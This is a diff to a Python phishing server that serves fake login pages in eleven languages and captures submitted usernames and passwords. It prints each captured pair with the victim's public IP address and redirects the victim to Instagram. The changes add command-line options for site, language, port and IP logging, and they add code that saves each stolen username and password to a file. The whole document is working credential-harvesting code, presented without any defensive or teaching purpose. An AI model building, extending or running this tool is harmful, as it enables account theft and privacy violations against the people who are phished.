@@ -1,5 +1,6 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from colorama import Fore, init
+import argparse
 import requests
 import socket
 
@@ -38,12 +39,44 @@ for part in parts:
     else:
         print(part, end='')
 
-print(Fore.BLUE)
-try:
-    chosen = int(input("Choice: "))
-except ValueError:
-    print(Fore.RED + "Invalid input. Please enter a number.")
-    exit()
+language_mapping = {
+    'ar': "htmls\\ar.html",
+    'az': "htmls\\az.html",
+    'ch': "htmls\\ch.html",
+    'en': "htmls\\index.html",
+    'fr': "htmls\\fr.html",
+    'de': "htmls\\de.html",
+    'it': "htmls\\it.html",
+    'ko': "htmls\\ko.html",
+    'ru': "htmls\\ru.html",
+    'es': "htmls\\es.html",
+    'tr': "htmls\\tr.html"
+}
+
+parser = argparse.ArgumentParser(description='Process site arguments.')
+parser.add_argument('--site', type=int, required=True, help='Site number')
+parser.add_argument('--lang', type=str, default='en', help='Language code')
+parser.add_argument('--port', type=int, default=0, help='Port number')
+parser.add_argument('--getip', action='store_true', help='Get public IP address')
+
+while True:
+    try:
+        user_input = input("Enter your choice in the format --site <number> --lang <language_code> [--port <port>] [--getip]: ").strip()
+        args = parser.parse_args(user_input.split())
+
+        chosen = args.site
+        lang = args.lang
+        port = args.port
+        get_ip = args.getip
+
+        web_site = language_mapping.get(lang.lower())
+        if not web_site:
+            raise ValueError("Invalid language code.")
+        
+        break  # Doğru girdi alındı, döngüden çık
+    except (ValueError, IndexError, SystemExit) as e:
+        print(Fore.RED + f"Invalid input. {e}. Please enter your choice in the format --site <number> --lang <language_code> [--port <port>] [--getip].")
+        continue  # Hatalı girdi alındı, döngü devam etsin
 print(Fore.GREEN)
 
 class MyHTTPRequestHandler(BaseHTTPRequestHandler):
@@ -82,21 +115,26 @@ class MyHTTPRequestHandler(BaseHTTPRequestHandler):
                 key, value = item.split('=')
                 data_dict[key] = value
 
-            public_ip = self.get_public_ip()
+            public_ip = self.get_public_ip() if get_ip else "IP logging disabled"
             
             print(Fore.RED, "Username:", data_dict['username'])
             print(Fore.RED, "Password:", data_dict['password'])
             print(Fore.RED, "Address:", public_ip, Fore.RESET)
 
             self.send_response(302)
-            self.send_header('Location', 'http://www.instagram.com')
+            self.send_header('Location', 'https://instagram.com')
             self.end_headers()
+
+            with open('data.py', 'w') as file:
+                file.write(f"Username = '{data_dict['username']}'\nPassword = '{data_dict['password']}'")
+
         except Exception as e:
             self.send_error(500, f'Failed to process POST request: {e}')
 
+
     def get_public_ip(self):
         try:
-            response = requests.get('https://api64.ipify.org?format=json')
+            response = requests.get('https://ipleak.net/json/')
             return response.json()['ip']
         except Exception as e:
             print("Failed to obtain public IP address:", e)
@@ -116,9 +154,7 @@ def get_ip_address():
 
 def find_empty_port(start_port=8000, end_port=65535):
     for port in range(start_port, end_port + 1):
-        if is_port_in_use(port):
-            print(f"{port} Port is in use, checking the next port...")
-        else:
+        if not is_port_in_use(port):
             return port
     print("No free ports were found in the specified range.")
     return None
@@ -133,49 +169,15 @@ def is_port_in_use(port):
         return True
 
 host = get_ip_address()
-c_port = find_empty_port()
-
-if chosen == 1:
-    print(Fore.RESET,"""            
-1. Arabic       4. English    7. Italian    10. Spanish
-2. Azerbaijani  5. French     8. Korean     11. Turkish
-3. Chinese      6. German     9. Russian""")
-
-print(Fore.BLUE)
-try:
-    lang = int(input("Choice: "))
-except ValueError:
-    print(Fore.RED + "Invalid input. Please enter a number.")
-    exit()
-print(Fore.GREEN)
-
-if lang ==  1:
-    web_site = "htmls\\ar.html"
-elif lang == 2:
-    web_site = "htmls\\az.html"
-elif lang == 3:
-    web_site = "htmls\\ch.html"
-elif lang == 4:
-    web_site = "htmls\\index.html"
-elif lang == 5:
-    web_site = "htmls\\fr.html"
-elif lang == 6:
-    web_site = "htmls\\de.html"
-elif lang == 7:
-    web_site = "htmls\\it.html"
-elif lang == 8:
-    web_site = "htmls\\ko.html"
-elif lang == 9:
-    web_site = "htmls\\ru.html"
-elif lang == 10:
-    web_site = "htmls\\es.html"
-elif lang == 11:
-    web_site = "htmls\\tr.html"
+if port:
+    if is_port_in_use(port):
+        print(Fore.RED, f"The specified port {port} is already in use.")
+        exit()
+    c_port = port
+else:
+    c_port = find_empty_port()
 
 if c_port:
-    print(f"Server IP Address: {host}")
-    print(f"Selected port: {c_port}\n")
-
     try:
         server = HTTPServer((host, c_port), MyHTTPRequestHandler)
         print(f"Server is started on: http://{host}:{c_port}/\n", Fore.RESET)
